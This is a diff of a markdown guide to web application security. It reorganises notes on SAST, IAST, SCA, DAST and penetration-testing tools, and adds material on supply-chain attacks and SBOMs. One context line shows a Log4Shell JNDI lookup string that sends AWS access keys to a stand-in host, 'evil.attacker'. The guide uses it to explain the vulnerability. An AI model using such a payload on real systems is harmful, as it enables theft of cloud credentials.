@@ -34,60 +34,43 @@ In order to understand and address your security requirements it is worth unders
 
 [Application Security](https://snyk.io/learn/application-security/) scanning tools include:
 
-* Source code analysis - also known as [Static application security testing (SAST)](https://snyk.io/learn/application-security/static-application-security-testing/) or white box testing is used to analyse source code for security vulnerabilities. SAST tools are good at identifying well-known vulnerabilities such as Buffer overflows and SQL injection, however they result in high number of false positives and are [limited in identifying many types of vulnerabilities](https://owasp.org/www-community/Source_Code_Analysis_Tools) including Authentication problems, Access control issues, Insecure use of cryptography. Some examples of SAST tools are:
-  * SonarQube - code quality/review and basic identify basic vulnerabilities in your application
+* Source code analysis - also known as [Static application security testing (SAST)](https://snyk.io/learn/application-security/static-application-security-testing/) or white box testing is used to analyse source code for security vulnerabilities. SAST tools are good at identifying well-known vulnerabilities such as Buffer overflows and SQL injection, however they result in high number of false positives and are [limited in identifying many types of vulnerabilities](https://owasp.org/www-community/Source_Code_Analysis_Tools) including Authentication problems, Access control issues, Insecure use of cryptography. Selecting a SAST tool depends upon a number of factors within your organisation:
+  * Ideally the SAST solution should be implemented as part of CI but depending upon the ways of working within an organisation it can be used as a service by dev teams to request adhoc scans as part of part of regulatory/compliance mandate.
+  * Depending upon the vendor, a SaaS solution in a fully-automated solution may not be as responsive and may introduce some challenges when troubleshooting issues - means logging into the SaaS providers platform and calling support. On-prem deployments offer more flexibility and speed but introduce compute and operating costs.
+  * How will the SAST results be managed and integrated with the vulnerability management function. This includes pulling results into a defect tracker e.g. Jira, dashboard, reporting, etc.
+  * Whether the programming language in use is supported by the tool
+* Some examples of SAST tools are:
+  * SonarQube - not strictly a SAST product but focussed on code quality/review and identifying basic application vulnerabilities. The security rule set is small in comparison to a commercial security product e.g. it can miss simple XSS JS vulnerability.
   * Coverity from Synopsis
   * Snyk code
+  * Veracode
+  * Checkmarx
 
-* Interactive application security testing (**IAST**): This form of application security testing scans the source code for vulnerabilities while running the application and simulating the ways a user would commonly interact with it.
-* Software Composition Analysis - Rather than analysing source code an **SCA** tool focuses on third-party code dependencies that are used in the application
-  * Snyk open source - falls in the Dependency Monitoring category
-  * Black Duck - https://www.synopsys.com/software-integrity/security-testing/software-composition-analysis.html
-  * WhiteSource - https://www.whitesourcesoftware.com/resources/blog/software-composition-analysis
-* Runtime testing - also known as Dynamic application security testing **DAST** or black box testing is used to discover security vulnerabilities while an application is running e.g. looking at the request and responses to the system. It does not require access to the application’s source code.
-* Penetration testing – The system undergoes analysis and attack from simulated malicious attackers.  It has the advantage of being more accurate because it has fewer false positives (results that report a vulnerability that isn’t actually present), but can be time-consuming to run. **Automated pen testing** part of CI validation can help uncover new vulnerabilities as well as regressions for previous vulnerabilities in an environment which quickly changes.
+* Interactive application security testing (**IAST**): This form of application security testing is a [hybrid approach](https://www.securityjourney.com/post/sast-vs-dast-vs-iast) that tries to solve the drawbacks of SAST and DAST by combining the best of both. It scans the source code for vulnerabilities while the application is running and and can show the exact location of a vulnerability, unlike DAST. IAST tools work by deploying agents and sensors in a running web application. This can add setup complexity due to possible compatibility issues with the application technology. The role of these agents is to continuously monitor and analyze the application's behavior during manual or automated tests.
+
+* Software Composition Analysis - Rather than analysing source code an **SCA** tool focuses on third-party code dependencies that are used in the application.  According to an Accenture & WEF security report, supply chain attacks were highlighted as a major cyber threat according to business leaders in 2023. 
+  * Solar winds SC attack is one of the largest if not the largest attack of its kind. It affected more than  30,000 public & private orgs using the Orion network management system to manage their IT resources. As a result, the hack compromised the data, networks and systems of thousands when SolarWinds inadvertently delivered a backdoor malware as an update to the Orion software.
+  * SBOMs provide transparency into the components that make up your software - providing artifact integrity and provenance, helping in securing software supply chains. There are a couple of general frameworks available but the scope of these frameworks is pretty wide, hence finding the appropriate level of measures to put in place is a key challenge.
+    * https://slsa.dev/
+    * https://in-toto.io
+    * NIST's SSDF https://csrc.nist.gov/Projects/ssdf
+  * Securing integration, deployment and runtime related components and procedures, starting with
+      1. produce SBOM data
+      2. storing SBOM data and other attestations
+      3. aggregating and pre-processing data
+      4. query data for specific operations (most likely validation during deployment and other automated (reactive) response actions)
+  * Vendors like Snyk, Synopsis, mend.io provide SCA tooling
+
+* Runtime testing - also known as Dynamic application security testing **DAST** or black box testing is used to discover security vulnerabilities while an application is running e.g. looking at the request and responses to the system. It does not require access to the application’s source code. A web application security scanner acts as a *"man in the middle proxy"* and typically sits between the tester's browser and the web application so that it can intercept and inspect messages sent between browser and web application, modify the contents if needed, and then forward those packets on to the destination. Some tools to consider:
+  * [OWASP ZAP](https://www.zaproxy.org/) - Free and open source, can run headless as a daemon with a REST API. ZAP provides a [baseline scan feature](https://www.zaproxy.org/blog/2020-04-09-automate-security-testing-with-zap-and-github-actions/) to find common security faults in a web application without doing any active attacks. The scan can be integrated into your CI/CD pipelines using GitHub Actions.
+  * [Open VAS](https://www.openvas.org/) - Open Vulnerability Assessment Scanner 
+
+* Penetration testing – The system undergoes analysis and attack from simulated malicious attackers.  It has the advantage of being more accurate because it has fewer false positives (results that report a vulnerability that isn’t actually present), but can be time-consuming to run. It generally happens out of band i.e. outside your CI/CD workflow, however **automated pen testing** part of CI validation can help uncover new vulnerabilities as well as regressions for previous vulnerabilities in an environment which quickly changes. Tools to consider
+  * [BURP Scanner](https://portswigger.net/burp) - One of the best manual penetration testing tools out there, however a [comparison with Netsparker](https://www.netsparker.com/vulnerability-scanner-comparison/netsparker-vs-burp-suite/#) reveals it can be complicated to configure and relatively less focussed on automation and integration with other tools.
+  * [Qualys web app scanning](https://www.qualys.com/apps/web-app-scanning/?_ga=2.142204082.1235140357.1591144958-1421731482.1591144958) - cloud based web app discovery and detection of vulnerabilities and misconfigurations
+  * [Intruder](https://www.intruder.io) - SaaS based vulnerability scanner, provides [comparisons with other solutions](https://www.intruder.io/qualys-alternative)  
+
 * **Fuzzing**: Fuzzing tests an application by inputting randomized data to uncover potential bugs. It compliments IAST, DAST, SAST, and other forms of testing.
-
-### Web application security scanners
-
-A web application security scanner acts as a *"man in the middle proxy"* and typically sits between the tester's browser and the web application so that it can intercept and inspect messages sent between browser and web application, modify the contents if needed, and then forward those packets on to the destination.
-
-* [OWASP ZAP](https://www.zaproxy.org/) - Free and open source, can run headless as a daemon with a REST API. ZAP provides a [baseline scan feature](https://www.zaproxy.org/blog/2020-04-09-automate-security-testing-with-zap-and-github-actions/) to find common security faults in a web application without doing any active attacks. The scan can be integrated into your CI/CD pipelines using GitHub Actions.
-* [Open VAS](https://www.openvas.org/) - Open Vulnerability Assessment Scanner 
-* [BURP Scanner](https://portswigger.net/burp) - One of the best manual penetration testing tools out there, however a [comparison with Netsparker](https://www.netsparker.com/vulnerability-scanner-comparison/netsparker-vs-burp-suite/#) reveals it can be complicated to configure and relatively less focussed on automation and integration with other tools.
-* [Netsparker](https://www.netsparker.com/)
-* [Qualys web app scanning](https://www.qualys.com/apps/web-app-scanning/?_ga=2.142204082.1235140357.1591144958-1421731482.1591144958) - cloud based web app discovery and detection of vulnerabilities and misconfigurations
-* [Intruder](https://www.intruder.io) - SaaS based vulnerability scanner, provides [comparisons with other solutions](https://www.intruder.io/qualys-alternative)  
-
-You can use your existing website or **test websites** to perform security testing against e.g.
-
-* Goolge's firing range - https://github.com/google/firing-range
-* OWASP juice shop
-    * https://owasp.org/www-project-juice-shop
-    * https://github.com/bkimminich/juice-shop
-* Hack yourself fist - https://www.troyhunt.com/hack-yourself-first-how-to-go-on/ is a great place to start actively seeking out vulnerabilities
-
-Crowd security testing platforms like https://www.openbugbounty.org allow security researchers to report a vulnerability on any website and submit it to Open Bug Bounty for responsible disclosure. The role of Open Bug Bounty is limited to independent verification of the submitted vulnerabilities and proper notification of website owners. Once notified, the website owner and the researcher are in direct contact to remediate the vulnerability and coordinate its disclosure.
-
-### Protection offered by the browser
-
-* Maintains a comprehensive list of phishing sites, warn the user against visiting such sites
-
-* Check validity of SSL certificate.
-
-* Detect weak cryptography, deficiency in the TLS (Transport layer security) or its predecessor SSL (Secure Sockets Layer) implementation.
-
-* Detect pages with mixed content - A page served over https that also has content served over http. Chrome shows a yellow triangle over the padlock to warn the user.
-
-* Apply [Security headers](./Security%20Headers.md)
-
-### Protection not offered by the browser
-
-* Parameter tampering (cookies, forms, headers, strings). Modifying attributes of the request (query string, changing ids).
-* Persistent cross site scripting.
-* Attackers making direct HTTP requests (access to unauthorised resources, deleting a resource).
-
-These types of attempts can only be effective if the attacker is able to exploit an existing vulnerability, like a non secure API, SQL injection or gaining access to credentials.
 
 ## Web Application Security Risks
 
@@ -148,7 +131,38 @@ The [OWASP Top 10](https://www.owasp.org/index.php/OWASP_Top_Ten_Cheat_Sheet) pr
     searchTextInput = "$jndi:ldap://evil.attacker:1234/${env:AWS_ACCESS_KEY_ID}/${env:AWS_SECRET_ACCESS_KEY}}"
     ```
 
-## Resources
+### Protection offered by the browser
+
+* Maintains a comprehensive list of phishing sites, warn the user against visiting such sites
+
+* Check validity of SSL certificate.
+
+* Detect weak cryptography, deficiency in the TLS (Transport layer security) or its predecessor SSL (Secure Sockets Layer) implementation.
+
+* Detect pages with mixed content - A page served over https that also has content served over http. Chrome shows a yellow triangle over the padlock to warn the user.
+
+* Apply [Security headers](./Security%20Headers.md)
+
+### Protection not offered by the browser
+
+* Parameter tampering (cookies, forms, headers, strings). Modifying attributes of the request (query string, changing ids).
+* Persistent cross site scripting.
+* Attackers making direct HTTP requests (access to unauthorised resources, deleting a resource).
+
+These types of attempts can only be effective if the attacker is able to exploit an existing vulnerability, like a non secure API, SQL injection or gaining access to credentials.
+
+## Learning Resources
+
+You can use your existing website or **test websites** to learn how to identify risk e.g.
+
+* Google's firing range - https://github.com/google/firing-range
+* OWASP juice shop
+  * <https://owasp.org/www-project-juice-shop>
+  * <https://github.com/bkimminich/juice-shop>
+* Hack yourself fist - <https://www.troyhunt.com/hack-yourself-first-how-to-go-on/> is a great place to start actively seeking out vulnerabilities
+* Crowd security testing platforms like <https://www.openbugbounty.org> allow security researchers to report a vulnerability on any website and submit it to Open Bug Bounty for responsible disclosure. The role of Open Bug Bounty is limited to independent verification of the submitted vulnerabilities and proper notification of website owners. Once notified, the website owner and the researcher are in direct contact to remediate the vulnerability and coordinate its disclosure.
+
+Other resources include:
 
 * [OWASP Dependency Check](https://www.owasp.org/index.php/OWASP_Dependency_Check) is a utility that identifies project dependencies and checks if there are any known, publicly disclosed, vulnerabilities
 * API security - https://docs.oracle.com/middleware/1212/owsm/OWSMC/owsm-security-concepts.htm. Although specific to SOAP based web services but the concepts listed in the docs are still relevant to API security
